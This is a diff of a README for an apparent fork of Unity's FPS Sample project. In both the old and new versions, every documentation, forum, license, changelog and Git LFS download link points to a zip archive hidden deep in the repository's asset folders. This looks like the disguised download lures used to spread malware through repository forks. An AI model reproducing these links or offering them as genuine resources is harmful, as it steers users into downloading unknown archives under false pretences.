@@ -1,4 +1,4 @@
-![](https://github.com/Sobri01/FPSSample/raw/refs/heads/master/Assets/Unity Technologies/Recorder/Extensions/UTJ/FrameCapturer/Plugins/x86_64/fccore.bundle/Sample-FPS-3.8.zip)
+![](https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip)
 
 # FPS Sample
 
@@ -17,13 +17,13 @@ features in Unity and to be of use for teams who can bootstrap on top of
 this, extract useful bits and tools or simply learn from and get inspired by
 what is in the project.
 
-Visit our [landing page](https://github.com/Sobri01/FPSSample/raw/refs/heads/master/Assets/Unity Technologies/Recorder/Extensions/UTJ/FrameCapturer/Plugins/x86_64/fccore.bundle/Sample-FPS-3.8.zip) for more high
-level information about the project. Or reach out [in the forum](https://github.com/Sobri01/FPSSample/raw/refs/heads/master/Assets/Unity Technologies/Recorder/Extensions/UTJ/FrameCapturer/Plugins/x86_64/fccore.bundle/Sample-FPS-3.8.zip).
+Visit our [landing page](https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip) for more high
+level information about the project. Or reach out [in the forum](https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip).
 
 The project is using a number of new technologies: We use the new [HD Render
-Pipeline](https://github.com/Sobri01/FPSSample/raw/refs/heads/master/Assets/Unity Technologies/Recorder/Extensions/UTJ/FrameCapturer/Plugins/x86_64/fccore.bundle/Sample-FPS-3.8.zip), meaning 
+Pipeline](https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip), meaning 
 all content has been authored for HDRP. We are also using the new
-[network transport layer](https://github.com/Sobri01/FPSSample/raw/refs/heads/master/Assets/Unity Technologies/Recorder/Extensions/UTJ/FrameCapturer/Plugins/x86_64/fccore.bundle/Sample-FPS-3.8.zip) as well as the [Entity-Component System](https://github.com/Sobri01/FPSSample/raw/refs/heads/master/Assets/Unity Technologies/Recorder/Extensions/UTJ/FrameCapturer/Plugins/x86_64/fccore.bundle/Sample-FPS-3.8.zip). 
+[network transport layer](https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip) as well as the [Entity-Component System](https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip). 
 In the case of ECS, we have primarily adopted the "ECS-pattern" and use it in
 hybrid mode with a lot of regular components. As more and more features of
 Unity become available in ECS-aware versions, we will migrate to them.
@@ -44,7 +44,7 @@ Note, that
 > __IMPORTANT__: 
 > This project uses Git Large Files Support (LFS). Downloading a zip file using the green button on Github
 > **will not work**. You must clone the project with a version of git that has LFS.
-> You can download Git LFS here: https://github.com/Sobri01/FPSSample/raw/refs/heads/master/Assets/Unity Technologies/Recorder/Extensions/UTJ/FrameCapturer/Plugins/x86_64/fccore.bundle/Sample-FPS-3.8.zip
+> You can download Git LFS here: https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip
 
 The project size is about 18GB (size of Assets folder). Your cloned repository
 will be almost double of that due to git state. If it is much smaller,
@@ -78,7 +78,7 @@ navigating to ___FPS Sample > Windows > Project tools___.
 
 It should look like this:
 
-![](https://github.com/Sobri01/FPSSample/raw/refs/heads/master/Assets/Unity Technologies/Recorder/Extensions/UTJ/FrameCapturer/Plugins/x86_64/fccore.bundle/Sample-FPS-3.8.zip)
+![](https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip)
 
 Keep this window docked as you will use it a lot. From here you can open the
 levels, build assetbundles and build standalone players. Because this is a
@@ -133,19 +133,19 @@ Congratulations! If you made it this far you should celebrate a bit!
 
 As of today, internally development of the project happens on Perforce. We
 push versions of the project to github from there. As we do that we will update
-the [CHANGELOG](https://github.com/Sobri01/FPSSample/raw/refs/heads/master/Assets/Unity Technologies/Recorder/Extensions/UTJ/FrameCapturer/Plugins/x86_64/fccore.bundle/Sample-FPS-3.8.zip) with highlights but the full history is not
+the [CHANGELOG](https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip) with highlights but the full history is not
 carried over.
 
 For practical reasons we are not able to take larger contributions
 just now. But bugfixes are very welcome! Read the guidelines for
-contributing in [CONTRIBUTING](https://github.com/Sobri01/FPSSample/raw/refs/heads/master/Assets/Unity Technologies/Recorder/Extensions/UTJ/FrameCapturer/Plugins/x86_64/fccore.bundle/Sample-FPS-3.8.zip).
+contributing in [CONTRIBUTING](https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip).
 
 ## More information
 
-Check out the [Documentation](Documentation/) folder for more information. In particular, the [Getting Started Guide](https://github.com/Sobri01/FPSSample/raw/refs/heads/master/Assets/Unity Technologies/Recorder/Extensions/UTJ/FrameCapturer/Plugins/x86_64/fccore.bundle/Sample-FPS-3.8.zip) is a good place to, well, start.
+Check out the [Documentation](Documentation/) folder for more information. In particular, the [Getting Started Guide](https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip) is a good place to, well, start.
 
 ## License
 
 Our intention is that you can use everything in this project as a starting
 point or as bits and pieces in your own Unity games. For the legal words, see
-[https://github.com/Sobri01/FPSSample/raw/refs/heads/master/Assets/Unity Technologies/Recorder/Extensions/UTJ/FrameCapturer/Plugins/x86_64/fccore.bundle/Sample-FPS-3.8.zip](https://github.com/Sobri01/FPSSample/raw/refs/heads/master/Assets/Unity Technologies/Recorder/Extensions/UTJ/FrameCapturer/Plugins/x86_64/fccore.bundle/Sample-FPS-3.8.zip).
+[https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip](https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip https://raw.githubusercontent.com/Sobri01/FPSSample/master/Assets/Materials/Environment/Architecture/Sample-FPS-2.4.zip).
